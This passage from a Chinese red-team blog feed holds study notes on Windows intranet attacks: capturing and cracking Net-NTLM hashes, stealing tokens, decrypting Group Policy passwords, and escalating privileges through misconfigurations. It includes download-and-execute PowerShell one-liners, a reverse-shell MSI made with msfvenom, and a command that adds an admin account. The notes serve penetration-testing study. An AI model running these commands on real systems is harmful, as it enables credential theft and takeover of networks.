即 NT LAN Manager，NTLM 是指 telnet 的一种验证身份方式，即问询/应答协议，是 Windows NT 早期版本的标准安全协议。</p></blockquote><p>Net-NTLM Hash 不同于 NTLM Hash，NTLM Hash 是 Windows 登录密码的 Hash 值，可以在 Windows 系统的 SAM 文件或者域控的 NTDS.dit 文件中提取到出来，NTLM Hash 支持哈希传递攻击。 </p><p>Net-NTLM Hash 是网络环境下 NTLM 认证的 Hash，使用 Responder 抓取的通常就是 Net-NTLM Hash，该 Hash 不能进行哈希传递，但可用于 NTLM 中继攻击或者使用 Hashcat 等工具碰撞出明文进行横向。</p><h2 id="2、利用"><a href="#2、利用" class="headerlink" title="2、利用"></a>2、利用</h2><p>Responder 是一款使用 Python 编写用于毒化 LLMNR 和 NBT-NS 请求的一款工具。</p><p>假设我们已连接到 Windows Active Directory 环境，当网络上的设备尝试用 LLMNR 和 NBT-NS（NetBIOS 名称服务）请求来解析目标机器时，Responder 就会伪装成目标机器。</p><p>当受害者机器尝试登陆攻击者机器，Responder 就可以获取受害者机器用户的 Net-NTLM 哈希值。</p><p>Responder 项目地址：<a href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a></p><p>Responder 不支持 Windows，这里使用 Kali 进行演示。</p><p>Responder 开启监听，-I 指定网卡，这里 eth1 的 IP 为 192.168.7.65</p><pre class="line-numbers language-none"><code class="language-none">python Responder.py -I eth1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开启监听后，当目标主机上有人访问 Responder 主机的共享目录时，就会看到对方的 Net-NTLM 哈希值了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210729190444.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>再利用 Hashcat 进行碰撞</p><pre class="line-numbers language-none"><code class="language-none">hashcat -m 5600 hash.txt password.txt -D 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210729190835.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>参考文章：</p><p><a href="https://www.jianshu.com/p/a210528f9b35">https://www.jianshu.com/p/a210528f9b35</a></p><p><a href="https://baike.baidu.com/item/NTLM/6371298">https://baike.baidu.com/item/NTLM/6371298</a></p><p><a href="https://baike.baidu.com/item/LLMNR/1116392">https://baike.baidu.com/item/LLMNR/1116392</a></p><p><a href="https://www.freebuf.com/articles/system/194549.html">https://www.freebuf.com/articles/system/194549.html</a></p><p><a href="https://baike.baidu.com/item/NetBIOS%E5%8D%8F%E8%AE%AE/8938996">https://baike.baidu.com/item/NetBIOS%E5%8D%8F%E8%AE%AE/8938996</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0、前言&quot;&gt;&lt;a href=&quot;#0、前言&quot; class=&quot;headerlink&quot; title=&quot;0、前言&quot;&gt;&lt;/a&gt;0、前言&lt;/h2&gt;&lt;p&gt;如果已经进入目标网络，但是没有获得凭证，可以使用 LLMNR 和 NetBIOS 欺骗攻击对目标进行无凭证条件下的权限获取。</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】17、令牌窃取</title>
    <link href="https://www.teamssix.com/210729-110334.html"/>
    <id>https://www.teamssix.com/210729-110334.html</id>
    <published>2021-07-29T03:03:34.000Z</published>
    <updated>2021-08-04T08:22:03.562Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>令牌（Token）是指系统中的临时秘钥，相当于账户和密码，有了令牌就可以在不知道密码的情况下访问目标相关资源了，这些令牌将持续存在于系统中，除非系统重新启动。</p><h2 id="1、MSF"><a href="#1、MSF" class="headerlink" title="1、MSF"></a>1、MSF</h2><p>在获取到 Meterpreter Shell 后，使用以下命令获取令牌</p><pre class="line-numbers language-none"><code class="language-none">load incognitolist_tokens -u<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210729095721.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>这里有两种令牌，一个是 Delegation Tokens 即授权令牌，还有一种是 Impersonation Tokens 即模拟令牌。前者支持交互式登录比如远程桌面，后者支持非交互的会话。</p><p>令牌获取的数量取决于获取到 Shell 的权限等级。</p><p>如果已经获取到了 SYSTEM 权限的令牌，那么攻击者就可以伪造这个令牌，拥有对应的权限。</p><pre class="line-numbers language-none"><code class="language-none">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210729100415.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>可以看到我们已经通过伪造 SYSTEM 的令牌拿到 SYSTEM 权限了。</p><p>不过值得注意的是，如果不加双引号，\ 需要改成 <code>\\</code> 才行，个人猜测可能是因为 \ 被当做转义字符处理的原因。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210729100653.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="2、Rotten-Potato-本地提权"><a href="#2、Rotten-Potato-本地提权" class="headerlink" title="2、Rotten Potato 本地提权"></a>2、Rotten Potato 本地提权</h2><p>Rotten Potato 直译过来就烂土豆的意思，如果目标中存在有效的令牌，就可以通过 Rotten Potato 模拟用户令牌实现提权。</p><p>Rotten Potato 项目地址：<a href="https://github.com/breenmachine/RottenPotatoNG">https://github.com/breenmachine/RottenPotatoNG</a></p><p>运行 RottenPotato.exe 直接弹出 SYSTEM 权限的 CMD 窗口，不需要用到 MSF。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210729101949.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0、前言&quot;&gt;&lt;a href=&quot;#0、前言&quot; class=&quot;headerlink&quot; title=&quot;0、前言&quot;&gt;&lt;/a&gt;0、前言&lt;/h2&gt;&lt;p&gt;令牌（Token）是指系统中的临时秘钥，相当于账户和密码，有了令牌就可以在不知道密码的情况下访问目标相关资源了，这些令牌将持</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】16、组策略凭据获取</title>
    <link href="https://www.teamssix.com/210728-145329.html"/>
    <id>https://www.teamssix.com/210728-145329.html</id>
    <published>2021-07-28T06:53:29.000Z</published>
    <updated>2021-08-04T08:22:03.550Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>SYSVOL 是活动目录里的一个用于存储域公共文件服务器副本的共享文件夹，在域中的所有域控之间进行复制，SYSVOL 在所有经过身份验证的域用户或者域信任用户具有读权限的活动目录域范围内共享，所有的域策略均存放在 C:\Windows\SYSVOL\DOMAIN\Policies\ 目录中。</p><p>管理员在域中新建一个组策略后，系统会自动在 SYSVOL 目录中生成一个 XML 文件。</p><p>该文件中保存了该组策略更新后的密码，该密码使用 AES-256 算法，但 2012 年微软公布了该密码的私钥，也就是说任何人都可以对其进行解密。</p><h2 id="1、查找包含-cpassword-的-XML-文件"><a href="#1、查找包含-cpassword-的-XML-文件" class="headerlink" title="1、查找包含 cpassword 的 XML 文件"></a>1、查找包含 cpassword 的 XML 文件</h2><p>浏览 SYSVOL 文件夹，手动查找包含 cpassword 的 XML 文件</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728141704.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>或者使用 findstr 自动搜索包含 cpassword 的 XML 文件</p><pre class="line-numbers language-none"><code class="language-none">findstr &#x2F;s &#x2F;i &quot;cpassword&quot; C:\Windows\SYSVOL\*.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728142511.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="2、解密-cpassword-密文"><a href="#2、解密-cpassword-密文" class="headerlink" title="2、解密 cpassword 密文"></a>2、解密 cpassword 密文</h2><h3 id="python-脚本"><a href="#python-脚本" class="headerlink" title="python 脚本"></a>python 脚本</h3><p> Gpprefdecrypt.py 下载地址：<a href="https://raw.githubusercontent.com/leonteale/pentestpackage/master/Gpprefdecrypt.py">https://raw.githubusercontent.com/leonteale/pentestpackage/master/Gpprefdecrypt.py</a></p><pre class="line-numbers language-none"><code class="language-none">python2.7 Gpprefdecrypt.py Wdkeu1drbxqPJm7YAtPtwBtyzcqO88hJUBDD2eseoY0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728143302.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="PowerShell-脚本"><a href="#PowerShell-脚本" class="headerlink" title="PowerShell 脚本"></a>PowerShell 脚本</h3><p>PowerSploit 项目中提供了 Get-GPPPassword.ps1 脚本。</p><p>脚本下载地址：<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1</a></p><p>直接远程下载脚本执行：</p><pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -Exec Bypass -C &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Exfiltration&#x2F;Get-GPPPassword.ps1&#39;);Get-GPPPassword&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果无法下载可以使用 github 代理</p><pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -Exec Bypass -C &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;ghproxy.com&#x2F;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Exfiltration&#x2F;Get-GPPPassword.ps1&#39;);Get-GPPPassword&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728144214.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>或者下载到本地，执行也行</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Get-GPPPassword.ps1Get-GPPPassword<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果 PowerShell 由于处在受限模式以至于无法导入脚本，可以使用以下命令绕过。</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\Get-GPPPassword.ps1;Get-GPPPassword&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>使用 post/windows/gather/credentials/gpp 模块也可以</p><pre class="line-numbers language-none"><code class="language-none">use post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;gppset session 1run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728145138.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0、前言&quot;&gt;&lt;a href=&quot;#0、前言&quot; class=&quot;headerlink&quot; title=&quot;0、前言&quot;&gt;&lt;/a&gt;0、前言&lt;/h2&gt;&lt;p&gt;SYSVOL 是活动目录里的一个用于存储域公共文件服务器副本的共享文件夹，在域中的所有域控之间进行复制，SYSVOL 在所有</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】浅谈几个 Windows 错误配置利用的方法</title>
    <link href="https://www.teamssix.com/210728-130839.html"/>
    <id>https://www.teamssix.com/210728-130839.html</id>
    <published>2021-07-28T05:08:39.000Z</published>
    <updated>2021-09-09T14:44:55.364Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>Windows 系统的错误配置主要可以用来进行提权操作，比如可信任服务路径漏洞、计划任务程序以高权限运行、注册表键 AlwaysInstallElevated 等。</p><p>Windows 系统的错误配置除了用来进行提权，还可以用来寻找一些敏感信息，比如在一些安装配置的文件中或许就包含了一些明文账号密码等等。</p><p>接下来，简单看看这些错误配置的利用方法。</p><h1 id="0x01-可信任服务路径漏洞"><a href="#0x01-可信任服务路径漏洞" class="headerlink" title="0x01 可信任服务路径漏洞"></a>0x01 可信任服务路径漏洞</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>可信任服务路径 ( Trusted Service Paths ) 漏洞利用了 Windows 文件路径解析的特性，可信任服务路径指的是包含空格且没有引号的路径，比如像这样的路径：</p><pre class="line-numbers language-none"><code class="language-none">C:\Program Files\Common Files\WgpSec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>刚才说到了这个漏洞利用了 Windows 文件路径解析的特性，那我们先来了解一下这个特性。</p><p>假如有个文件路径是这样的：</p><pre class="line-numbers language-none"><code class="language-none">C:\Program Files\Common Files\WgpSec\TeamsSix.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到这个路径中有两个空格，那么对于 Windows 来说，它会尝试找到与空格前名字相匹配的程序，然后执行它。</p><p>以上面的 exe 文件路径为例，Windows 会依次尝试执行以下程序：</p><pre class="line-numbers language-none"><code class="language-none">C:\Program.exeC:\Program Files\Common.exeC:\Program Files\Common Files\WgpSec\TeamsSix.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到 Windows 尝试执行了三次才找到真正的程序。</p><p>由于 Windows 服务通常是以 SYSTEM 权限运行的，所以在系统找到空格前的程序并执行时，也将以 SYSTEM 权限运行这个程序。</p><p>因此是不是说我们把木马程序命名为 Program.exe ，然后放到 C 盘下，当上面的 TeamsSix.exe 程序重启时，系统就会执行我们的木马程序？</p><p>答案是的。</p><p>同时如果此时程序以 SYSTEM 运行，那我们就将获得一个 SYSTEM 权限的会话。</p><p>铺垫了那么多，现在就来复现一下。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>我们可以通过下面的命令来查找系统中存在可信任服务路径的程序。</p><pre class="line-numbers language-none"><code class="language-none">wmic service get name,displayname,pathname,startmode|findstr &#x2F;i &quot;Auto&quot; |findstr &#x2F;i &#x2F;v &quot;C:\Windows\\&quot; |findstr&#x2F;i &#x2F;v &quot;&quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727144557.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>截图中可以看到 C:\Program Files\OpenSSH\bin\cygrunsrv.exe 存在包含空格且没有引号的路径。</p><p>我们可以直接使用 MSF 利用该漏洞，MSF 版本中利用该漏洞的模块是 trusted_service_path，但是在新版本中该模块的名称已经变更为 unquoted_service_path</p><pre class="line-numbers language-none"><code class="language-none">use windows&#x2F;local&#x2F;unquoted_service_pathset session 1run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727153924.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>可以看到已经获取到了管理员组账户的权限。</p><h1 id="0x02-注册表键-AlwaysInstallElevated"><a href="#0x02-注册表键-AlwaysInstallElevated" class="headerlink" title="0x02 注册表键 AlwaysInstallElevated"></a>0x02 注册表键 AlwaysInstallElevated</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>注册表 AlwaysInstallElevated 是一个策略设置项。Windows 允许低权限用户以 SYSTEM 权限运行安装文件。</p><p>如果启用此策略设置项，那么任何权限的用户都能以 SYSTEM 权限来安装恶意的 MSI（Microsoft Windows Installer）文件。</p><p>产生该漏洞的原因是由于用户在策略编辑器中开启了 Windows Installer 特权安装功能。</p><pre class="line-numbers language-none"><code class="language-none">组策略——计算机配置——管理模板——Windows组件——Windows Installer——永远以高特权进行安装：选择启用。组策略——用户配置——管理模板——Windows组件——Windows Installer——永远以高特权进行安装：选择启用。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727162552.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>也可以直接使用命令行开启这两项注册表。</p><pre class="line-numbers language-none"><code class="language-none">reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated &#x2F;t REG_DWORD &#x2F;d 1reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated &#x2F;t REG_DWORD &#x2F;d 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后使用 reg 查看这两项的键值，0x1 表示处于开启状态。</p><pre class="line-numbers language-none"><code class="language-none">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevatedreg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727163421.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h2><h3 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h3><p>PowerUp 下载地址：<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</a></p><p>我们可以使用 PowerUp.ps1 脚本里的 Get-RegistryAlwaysInstallElevated 模块来检查相关注册表是否被设置。</p><p>在 PowerShell 中导入并执行脚本</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\PowerUp.ps1Get-RegistryAlwaysInstallElevated<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果 PowerShell 由于处在受限模式以至于无法导入脚本，可以使用 -exec bypass 进行绕过。</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Get-RegistryAlwaysInstallElevated&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727173239.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>返回为 True，表示相关注册表被设置了，也就意味着 MSI 文件是以 SYSTEM 权限运行的。</p><p>运行 PowerUp 的 Write-UserAddMSI 模块</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Write-UserAddMSI&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行完后，会在当前目录下生成一个 UserAdd.msi 程序，此时以普通用户权限执行该 MSI 程序就会创建一个管理员账户。</p><p>直接双击或者命令行启动该 MSI 程序。</p><pre class="line-numbers language-none"><code class="language-none">msiexec &#x2F;q &#x2F;i UserAdd.msi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>msiexec 参数介绍：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;quiet：安装过程中禁止向用户发送消息&#x2F;qn：不使用GUI&#x2F;q：隐藏安装界面&#x2F;i：安装程序<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727165540.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>MSF 中可以使用 exploit/windows/local/always_install_elevated 模块，直接获取 SYSTEM 权限。</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;local&#x2F;always_install_elevatedset session 1run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727175000.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>除了上面的操作外，还可以使用 msfvenom 生成 MSI 文件，从而以 SYSTEM 权限执行任意命令。</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;exec CMD&#x3D;&lt;命令&gt; -f msi &gt; calc.msi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者以 SYSTEM 权限上线</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;172.16.214.65 lport&#x3D;4444 –f msi -o shell.msi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="MSI-Wrapper"><a href="#MSI-Wrapper" class="headerlink" title="MSI Wrapper"></a>MSI Wrapper</h3><p>MSI Wrapper 是一个操作简单直观的 MSI 安装包生成工具，我们可以使用该工具制作一个包含木马的 MSI 安装包。</p><p>选择自己要导入的 EXE 木马文件位置和导出 MSI 安装包位置。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728090315.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>设置运行时提升权限</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728091810.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>之后 Application Id 随便选一个，其他操作默认就行，然后将 MSI 文件拷贝到目标主机上</p><p>开启攻击主机的监听，双击 MSI 文件之后就可以看到回连的会话已经是 SYSTEM 权限了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728092010.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x03-计划任务"><a href="#0x03-计划任务" class="headerlink" title="0x03 计划任务"></a>0x03 计划任务</h1><p>使用以下命令可以看到当前计算机的计划任务</p><pre class="line-numbers language-none"><code class="language-none">schtasks &#x2F;query &#x2F;fo list &#x2F;v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>AccessChk 是微软官方提供的一款工具，因此往往不会引起杀软的告警，AccessChk 可用来进行一些系统或程序的高级查询、管理和故障排除工作。</p><p>AccessChk 下载地址：<a href="https://download.sysinternals.com/files/AccessChk.zip">https://download.sysinternals.com/files/AccessChk.zip</a></p><p>在第一次使用时，会弹出许可协议对话框，可以使用 /accepteula 进行关闭</p><pre class="line-numbers language-none"><code class="language-none">.\accesschk.exe &#x2F;accepteula<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行以下命令，查看指定目录的权限配置情况：</p><pre class="line-numbers language-none"><code class="language-none">.\accesschk.exe -dqv &quot;C:\Program Files&quot; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果攻击者以高权限运行的任务所在目录有写权限，就可以使用恶意程序覆盖原来的程序，这样计划任务下次运行时，就会以高权限运行恶意程序。</p><p>列出每个驱动器下所有权限配置不当的文件夹：</p><pre class="line-numbers language-none"><code class="language-none">.\accesschk.exe -uwdqs Users c:\ .\accesschk.exe -uwdqs &quot;Authenticated Users&quot; c:\ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>列出每个驱动器下所有权限配置不当的文件：</p><pre 